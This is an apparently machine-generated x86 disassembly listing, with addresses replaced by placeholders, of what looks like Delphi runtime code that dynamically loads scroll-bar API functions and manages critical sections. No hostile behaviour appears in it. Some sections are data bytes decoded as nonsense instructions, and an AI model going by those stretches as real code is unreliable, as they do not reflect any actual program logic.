call sub_405690
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c44
lea eax [ ebp - 0xc ]
call sub_40564c
lea eax [ ebp - 0x8 ]
call sub_40564c
retn
sub edx 0xfffffff8
sub_424c5c
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_423be4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_424c9c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_423be4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_424ccc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_424e5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_423be4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424df9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e65
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_423be4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
mov eax esi
xor edx edx
call sub_423be4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_423be4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_423be4
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_424e6c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_424f51
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_404034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f58
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a68
lea eax [ ebp - 0x8 ]
call sub_40564c
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_423be4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405664
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405690
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_423be4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405664
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405690
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_425188
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42527b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_404034
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425282
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a68
lea eax [ ebp - 0x10 ]
call sub_40564c
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405690
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_423be4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405664
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405690
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_4252a0
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42537f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_404034
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425386
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a68
lea eax [ ebp - 0x8 ]
call sub_40564c
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405690
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_423be4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405664
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405690
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_4253a0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4056c0
xor eax eax
push ebp
push sub_4253ef
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405664
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4253f6
lea eax [ ebx + 0xc ]
call sub_40564c
sub_4253fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404490
xor eax eax
push ebp
push sub_425491
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_404034
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_425188
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425498
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax ebx
call sub_424c9c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_424ccc
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_424e6c
sub_4254bc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_423be4
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_423be4
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413964
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_423be4
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_413964
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_413964
sub_425548
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
call sub_424c5c
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403290
mov eax [ esi + 0x14 ]
call sub_403290
mov eax [ esi + 0x10 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40564c
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_42559c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4255d3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4255da
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_4255e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425609
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425610
retn
sub_42561c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42564d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425654
retn
mov eax [ rw-data ]
call sub_403290
sub_425660
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_425694
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_4256bc
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42593e
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425965
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42596c
retn
sub_425981
pop ecx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
pop ecx
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx + ebx * 2 + 0x42 ] cl
add [ eax + 0x5a ] dl
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x30 ] si
pop edx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
pop edx
inc edx
add [ eax + eax ] bl
add [ eax ] al
sbb [ ecx + 0x42 ] 0x0
fdiv [ eax + eax * 2 ]
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xchg esp eax
pop edx
inc edx
add ah al
pop edx
inc edx
add al dl
pop edx
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_425a54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_425a94
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_425aec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425b11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b18
retn
sub_425b24
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425adc
xor eax eax
push ebp
push sub_425cdb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ce2
mov eax [ rw-data ]
call sub_425ae4
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_425ce4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_425adc
xor eax eax
push ebp
push sub_426097
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42609e
mov eax [ rw-data ]
call sub_425ae4
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_426448
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_426470
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4264b8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264bf
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403290
call sub_425b24
cmp [ rw-data ] 0x0
jg r-xdata
sub_4264e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426505
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42650c
retn
sub_426518
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42653d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426544
retn
sub_426550
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426575
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42657c
retn
sub_426588
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4265ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4265b4
retn
sub_4265c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4265e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4265ec
retn
sub_4265f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42661d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426624
retn
sub_426630
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426655
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42665c
retn
sub_426668
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42668d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426694
retn
sub_4266a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4266c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4266cc
retn
sub_4267e3
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
dec edi
outsd
outsb
je r-xdata
mov ebx edx
